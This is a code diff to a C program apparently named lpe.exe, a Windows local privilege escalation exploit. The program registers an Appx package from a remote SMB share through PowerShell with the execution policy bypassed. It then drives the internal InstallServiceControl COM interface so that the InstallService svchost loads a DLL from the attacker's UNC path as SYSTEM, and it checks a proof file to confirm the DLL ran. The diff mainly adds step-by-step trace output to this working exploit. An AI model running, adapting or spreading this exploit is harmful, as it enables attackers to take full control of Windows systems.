@@ -3,6 +3,7 @@
 #include <string.h>
 #include <wchar.h>
 #include <process.h>
+#include <errno.h>
 
 typedef HRESULT (WINAPI *RoInitializeFn)(int);
 typedef void (WINAPI *RoUninitializeFn)(void);
@@ -22,6 +23,10 @@ static int register_package(const char *host, const char *share, WCHAR *pfn, int
 	char cmd[1024];
 	char line[1024];
 	char *sep;
+	int st;
+
+	printf("[*] appx -> _popen -> powershell Add-AppxPackage -Register \\\\%s\\%s\\AppxManifest.xml\n", host, share);
+	printf("\t[~] Get-AppxPackage -Name %s | Remove-AppxPackage\n", package_name);
 
 	snprintf(cmd, sizeof(cmd),
 		"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \""
@@ -33,31 +38,36 @@ static int register_package(const char *host, const char *share, WCHAR *pfn, int
 		package_name, host, share, package_name);
 
 	FILE *pipe = _popen(cmd, "r");
-	if (!pipe)
-		return -1;
-
-	if (!fgets(line, (int)sizeof(line), pipe)) {
-		_pclose(pipe);
+	if (!pipe) {
+		printf("\t[~] _popen -> failed (errno=%d)\n", errno);
 		return -1;
 	}
 
-	{
-		int st = _pclose(pipe);
-		if (st != 0) {
-			printf("\tpowershell exit=%d output:\n%s\n", st, line);
-			return st;
-		}
+	if (!fgets(line, (int)sizeof(line), pipe)) {
+		_pclose(pipe);
+		printf("\t[~] read -> no output from registration script\n");
+		return -1;
+	}
+
+	st = _pclose(pipe);
+	if (st != 0) {
+		printf("\t[~] exit code -> %d\n", st);
+		printf("\t[~] output -> %s", line);
+		return st;
 	}
 
 	sep = strchr(line, '|');
 	if (!sep) {
-		printf("\tunexpected package output:\n%s\n", line);
+		printf("\t[~] parse -> expected PFN|InstalledLocation, got:\n%s", line);
 		return -1;
 	}
 
 	*sep = 0;
 	MultiByteToWideChar(CP_ACP, 0, line, -1, pfn, pfn_len);
 	snprintf(location, location_len, "%s", sep + 1);
+
+	printf("\t[~] PackageFamilyName -> %s\n", line);
+	printf("\t[~] InstalledLocation -> %s\n", location);
 	return 0;
 }
 
@@ -136,21 +146,25 @@ static HRESULT trigger_install_work(
 		L"{\"SkipCatalogLookup\":true,\"SourceUri\":%ls,\"ProductId\":\"coerce\",\"SkuId\":\"0001\",\"ProductTitle\":\"coerce\",\"PackageFamilyName\":%ls,\"FulfillmentPluginId\":%ls,\"Market\":\"US\",\"SerializedFulfillmentData\":%ls}",
 		json_unc, json_pfn, json_pfn, json_fulfillment);
 
-	ro_initialize(1);
+	printf("[*] combase -> RoInitialize(RO_INIT_SINGLETHREADED)\n");
+	result = ro_initialize(1);
+	printf("\t[~] hr -> 0x%08X\n", (unsigned int)result);
+
+	printf("[*] combase -> WindowsCreateString(InstallServiceControl)\n");
 	windows_create_string(L"Windows.Internal.InstallService.Control.InstallServiceControl",
 		(UINT32)wcslen(L"Windows.Internal.InstallService.Control.InstallServiceControl"), &class_name);
 
+	printf("[*] combase -> RoActivateInstance(InstallServiceControl)\n");
 	result = ro_activate_instance(class_name, &instance);
-	if (FAILED(result)) {
-		printf("\tRoActivateInstance=0x%08X\n", (unsigned int)result);
+	printf("\t[~] hr -> 0x%08X\n", (unsigned int)result);
+	if (FAILED(result))
 		goto done;
-	}
 
+	printf("[*] vtable[0] -> QueryInterface(IInstallServiceControl e4893a99-9270-42b9-9a62-683d6ceed250)\n");
 	result = ((QueryInterfaceFn)VTABLE(instance, 0))(instance, &install_service_iid, &control);
-	if (FAILED(result)) {
-		printf("\tQueryInterface=0x%08X\n", (unsigned int)result);
+	printf("\t[~] hr -> 0x%08X\n", (unsigned int)result);
+	if (FAILED(result))
 		goto done;
-	}
 
 	windows_create_string(L"uncanny", 7, &correlation);
 	windows_create_string(L"", 0, &caller);
@@ -159,7 +173,14 @@ static HRESULT trigger_install_work(
 	windows_create_string(properties, (UINT32)wcslen(properties), &props);
 	windows_create_string(L"{}", 2, &options);
 
+	printf("[*] vtable[8] -> CreateInstallServiceWork\n");
+	printf("\t[~] FulfillmentPluginId -> %ls\n", pfn);
+	printf("\t[~] SkipCatalogLookup -> true\n");
+	printf("\t[~] SourceUri -> %ls\n", unc);
+	printf("\t[~] expected SYSTEM path -> PluginHelpers::ActivatePlugin -> LoadLibraryW(%ls)\n", unc);
+
 	result = ((CreateWorkFn)VTABLE(control, 8))(control, correlation, caller, arg3, arg4, props, options, &view);
+	printf("\t[~] hr -> 0x%08X (async work queued; loader runs inside InstallService svchost)\n", (unsigned int)result);
 
 done:
 	if (correlation)
@@ -182,8 +203,9 @@ done:
 		((ReleaseFn)VTABLE(instance, 2))(instance);
 	if (class_name)
 		windows_delete_string(class_name);
-	ro_uninitialize();
 
+	printf("[*] combase -> RoUninitialize\n");
+	ro_uninitialize();
 	return result;
 }
 
@@ -214,7 +236,6 @@ int main(int argc, char **argv)
 
 	if (argc < 2) {
 		printf("usage: lpe.exe <host> [share] [package] [pfn]\n");
-		printf("example: lpe.exe ATTACKER_IP coerce\n");
 		return 1;
 	}
 
@@ -224,25 +245,10 @@ int main(int argc, char **argv)
 	pfn_arg = argc >= 5 ? argv[4] : NULL;
 	snprintf(package_name, sizeof(package_name), "%s", package_arg);
 
-	combase = LoadLibraryW(L"combase.dll");
-	if (!combase) {
-		printf("[-] LoadLibraryW(combase.dll) failed\n");
-		return 1;
-	}
-
-	ro_initialize = (RoInitializeFn)GetProcAddress(combase, "RoInitialize");
-	ro_uninitialize = (RoUninitializeFn)GetProcAddress(combase, "RoUninitialize");
-	windows_create_string = (WindowsCreateStringFn)GetProcAddress(combase, "WindowsCreateString");
-	windows_delete_string = (WindowsDeleteStringFn)GetProcAddress(combase, "WindowsDeleteString");
-	ro_activate_instance = (RoActivateInstanceFn)GetProcAddress(combase, "RoActivateInstance");
-
-	if (!ro_initialize || !ro_uninitialize || !windows_create_string || !windows_delete_string || !ro_activate_instance) {
-		printf("[-] GetProcAddress combase exports failed\n");
-		return 1;
-	}
-
+	printf("[*] caller -> GetUserNameA\n");
 	user_len = (DWORD)sizeof(user);
 	GetUserNameA(user, &user_len);
+	printf("\t[~] user -> %s\n", user);
 
 	elevated = FALSE;
 	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
@@ -251,12 +257,29 @@ int main(int argc, char **argv)
 			elevated = elevation.TokenIsElevated ? TRUE : FALSE;
 		CloseHandle(token);
 	}
+	printf("[*] caller -> OpenProcessToken(TokenElevation) -> %s\n", elevated ? "elevated" : "medium");
 
-	printf("[*] user: %s\n", user);
-	printf("[*] elevated: %s\n", elevated ? "true" : "false");
-	printf("[*] manifest: \\\\%s\\%s\\AppxManifest.xml\n", host, share);
-	printf("[*] payload path: \\\\%s\\%s\\InstallServicePlugin.dll\n\n", host, share);
-	printf("[*] package: %s\n", package_name);
+	combase = LoadLibraryW(L"combase.dll");
+	if (!combase) {
+		printf("[*] kernel32 -> LoadLibraryW(combase.dll) -> failed gle=%lu\n", GetLastError());
+		return 1;
+	}
+	printf("[*] kernel32 -> LoadLibraryW(combase.dll) -> %p\n", combase);
+
+	ro_initialize = (RoInitializeFn)GetProcAddress(combase, "RoInitialize");
+	ro_uninitialize = (RoUninitializeFn)GetProcAddress(combase, "RoUninitialize");
+	windows_create_string = (WindowsCreateStringFn)GetProcAddress(combase, "WindowsCreateString");
+	windows_delete_string = (WindowsDeleteStringFn)GetProcAddress(combase, "WindowsDeleteString");
+	ro_activate_instance = (RoActivateInstanceFn)GetProcAddress(combase, "RoActivateInstance");
+
+	if (!ro_initialize || !ro_uninitialize || !windows_create_string || !windows_delete_string || !ro_activate_instance) {
+		printf("[*] kernel32 -> GetProcAddress(combase exports) -> incomplete\n");
+		return 1;
+	}
+
+	printf("[*] package -> %s\n", package_name);
+	printf("[*] manifest -> \\\\%s\\%s\\AppxManifest.xml\n", host, share);
+	printf("[*] dll share -> \\\\%s\\%s\\InstallServicePlugin.dll\n", host, share);
 
 	memset(pfn, 0, sizeof(pfn));
 	memset(location, 0, sizeof(location));
@@ -264,44 +287,36 @@ int main(int argc, char **argv)
 	if (pfn_arg) {
 		MultiByteToWideChar(CP_ACP, 0, pfn_arg, -1, pfn, 256);
 		snprintf(location, sizeof(location), "\\\\%s\\%s", host, share);
-		printf("[1] using supplied PFN\n");
+		printf("[*] appx -> using caller-supplied PackageFamilyName\n");
+		printf("\t[~] PackageFamilyName -> %s\n", pfn_arg);
+		printf("\t[~] InstalledLocation -> %s\n", location);
 	} else {
-		printf("[1] registering loose package from UNC\n");
 		register_result = register_package(host, share, pfn, 256, location, (int)sizeof(location));
 		if (register_result != 0 || !pfn[0]) {
-			printf("[-] package registration failed, result=%d\n", register_result);
-			printf("\tcheck Developer Mode, interactive session, manifest files, and NTFS-reporting SMB share\n");
+			printf("[*] appx -> registration failed (Developer Mode / interactive session / NTFS SMB?)\n");
 			return 1;
 		}
 	}
 
-	printf("\tPFN: %ls\n", pfn);
-	printf("\tInstalledLocation: %s\n\n", location);
-
 	if (strncmp(location, "\\\\", 2) != 0) {
-		printf("[-] InstalledLocation is not UNC, stopping before trigger\n");
+		printf("[*] appx -> InstalledLocation is local, not UNC -> abort before trigger\n");
 		return 1;
 	}
 
-	printf("[2] submitting CreateInstallServiceWork\n");
 	trigger_result = trigger_install_work(ro_initialize, ro_uninitialize, windows_create_string,
 		windows_delete_string, ro_activate_instance, pfn, host, share);
-	printf("\tCreateInstallServiceWork=0x%08X\n\n", (unsigned int)trigger_result);
 
-	Sleep(1000);
+	Sleep(1500);
 
 	proof_attr = GetFileAttributesW(L"C:\\Users\\Public\\uncanny_lpe.txt");
 	proof_exists = proof_attr != INVALID_FILE_ATTRIBUTES && !(proof_attr & FILE_ATTRIBUTE_DIRECTORY);
 
-	if (proof_exists) {
-		printf("[+] proof file exists: C:\\Users\\Public\\uncanny_lpe.txt\n");
-		printf("[+] the remote DLL executed inside the service process\n");
-	} else if (SUCCEEDED(trigger_result)) {
-		printf("[+] InstallService should try LoadLibraryW on the UNC payload path\n");
-		printf("[+] proof file is missing, so only claim coercion until the DLL marker appears\n");
-	} else {
-		printf("[-] trigger failed before the proof file appeared\n");
-	}
+	if (proof_exists)
+		printf("[+] uncanny_lpe.txt -> present (DllMain in svchost as SYSTEM)\n");
+	else if (SUCCEEDED(trigger_result))
+		printf("[*] uncanny_lpe.txt -> missing (coercion may still have fired; need Samba-hosted loadable dll)\n");
+	else
+		printf("[*] uncanny_lpe.txt -> missing (CreateInstallServiceWork failed before loader)\n");
 
 	return proof_exists || SUCCEEDED(trigger_result) ? 0 : 1;
 }
